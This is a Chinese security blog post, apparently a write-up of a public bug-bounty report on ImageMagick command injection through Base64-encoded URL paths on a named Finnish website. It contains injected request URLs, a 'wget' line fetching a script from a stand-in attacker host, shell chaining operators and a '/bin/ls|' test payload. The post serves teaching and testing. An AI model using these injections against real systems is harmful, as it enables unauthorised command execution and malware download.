---
title: 通过命令注入来实现的RCE
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495199&idx=1&sn=9f92812648bf61f9b7bf52671c8f6a9a&chksm=e8a5e47cdfd26d6a1a2c2872ba9f5dadf47759dcb32fc5f4874241ecfa10e1a2a5c6c308a604&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-07-15
fetch_date: 2025-10-06T17:40:57.974674
---

# 通过命令注入来实现的RCE

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj7YMD3IrJqSPqB5gXPPxXU30ApWph5cOlLXakfoFtKqmfUibGRabjvogmOWnA8fAnNKnHvyZmMAHRg/0?wx_fmt=jpeg)

# 通过命令注入来实现的RCE

原创

richardo1o1

迪哥讲事

## 正常情况下

在没有遭受攻击的正常情况下，该网站的“`/system/images`”URL用于接收Base-64编码的字符串，这个字符串指向服务器上的某个图片文件，并且可能包含一些ImageMagick的convert命令的合法参数，用以处理图像（例如调整大小、改变质量等）。正常的请求看起来可能是这样：

```
https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMjAxNy8xMi8wMS8wOF8zNF8zNl80OTNfMDAxMDBfS2Fpc2FuaWVtZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6BkZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU
```

这里的Base-64编码部分解码后可能会是一个合法的路径加上ImageMagick的参数，如 `-strip -interlace Plane -quality 80%`，这些都是正常的图像处理命令。

## 受到攻击后

当受到攻击时，攻击者会通过注入恶意命令来修改或扩展Base-64编码的部分。攻击者可能会在合法的命令之后添加如 `&&` 这样的bash命令连接符，随后是一些恶意命令，比如 wget 来下载远程恶意脚本或工具，或是其他能够进一步损害系统安全的命令。被攻击的请求示例如下：

```
https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl8zNF8zNl80OTNfMDAxMDBfS2Fpc2FuaWVtZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6BkZlcnRJIikgJiYgd2dldCBodHRwOi8vZXZpbC5leGFtcGxlLmNvbS9tYWxpY2lvdXMuc2ggOw==
```

在这个例子中，Base-64编码部分解码后可能会包含 `-strip -interlace Plane -quality 80% && wget http://evil.example.com/malicious.sh，` 其中 `&& wget http://evil.example.com/malicious.sh`是被注入的恶意命令

这种情况下的攻击可以导致服务器执行未经授权的命令，可能会导致数据泄露、服务中断或更严重的安全威胁。

## 攻击流程

环节1: 构造恶意Base-64编码字符串

原始命令: 在正常情况下，ImageMagick的convert命令可能被用来调整图片质量或格式，例如：

```
convert -strip -interlace Plane -quality 80 input.jpg output.jpg
```

这些参数会在Base-64编码后作为URL的一部分。

注入恶意命令: 攻击者在这些参数后添加恶意命令。例如，要添加一个下载命令：

```
&& wget http://evil.example.com/malicious.sh
```

这个命令尝试从指定的URL下载一个恶意脚本。

完整的恶意命令:

```
convert -strip -interlace Plane -quality 80 input.jpg output.jpg && wget http://evil.example.com/malicious.sh
```

Base-64编码: 攻击者将整个命令行字符串进行Base-64编码。假设编码后的字符串为 `Q29udmVydCB-c3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCBpbnB1dC5qcGcgb3V0cHV0LmpwZyAmJiB3Z2V0IGh0dHA6Ly9ldmlsLmV4YW1wbGUuY29tL21hbGljaW91cy5zaA==`。

环节2: 发送攻击请求

构造URL: 攻击者将编码后的字符串作为URL的一部分发送给服务器：

```
https://toimitilat.lahitapiola.fi/system/images/Q29udmVydCB-c3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCBpbnB1dC5qcGcgb3V0cHV0LmpwZyAmJiB3Z2V0IGh0dHA6Ly9ldmlsLmV4YW1wbGUuY29tL21hbGljaW91cy5zaA==
```

环节3: 服务器执行命令

服务器处理: 服务器接收到请求，解码Base-64字符串，然后可能无意识地将其作为命令在服务器上执行。这就允许攻击者的恶意命令运行。

环节4: 潜在的后果

下载并执行恶意脚本: 如果服务器配置允许，下载的恶意脚本可能被执行，进一步损害服务器安全，如安装后门、窃取数据等。

## 总结与补充

这是一个典型的命令注入的问题

这里补充一些相关的知识点(主要是参考wstg)

基本的一些shell知识点:

```
cmd1 | cmd2 #只执行 cmd2
cmd1 || cmd2 #只有当 cmd1 执行失败后，cmd2 才被执行
cmd1 & cmd2 #先执行 cmd1，不管是否成功，都会执行 cmd2
cmd1 && cmd2 #先执行 cmd1，cmd1 执行成功后才执行 cmd2，否 则不执行 cmd2
$(cmd)  #当你需要将命令的输出作为另一个命令的参数时。例如:mkdir $(date +%Y-%m-%d),创建一个以当前日期命名的目录，例如2024-05-07
```

如何测试?

发现一些可疑的参数就可以去测试，这里举一些例子:

正常情况下:

```
http://sensitive/cgi-bin/userData.pl?doc=user1.txt
```

注入命令之后:

```
http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
```

##

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款
前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

## 参考

https://hackerone.com/reports/303061

https://owasp.org/www-project-web-security-testing-guide/stable/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/12-Testing\_for\_Command\_Injection.html

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过